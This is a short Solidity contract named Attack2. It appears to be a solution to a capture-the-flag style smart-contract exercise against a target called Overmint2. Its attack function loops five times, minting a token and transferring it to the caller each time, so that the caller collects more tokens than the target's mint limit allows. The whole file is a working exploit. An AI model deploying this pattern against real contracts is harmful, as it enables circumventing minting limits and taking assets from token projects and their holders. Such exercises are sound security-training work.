// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.21;

import {Overmint2} from "./Overmint2.sol";

contract Attack2 {
    Overmint2 public overmint2;

    constructor(address _address) {
        overmint2 = Overmint2(_address);
    }

    function attack() external {
        for (uint256 i = 0; i < 5; i++) {
            overmint2.mint();
            overmint2.transferFrom(address(this), msg.sender, overmint2.totalSupply());
        }
    }
}
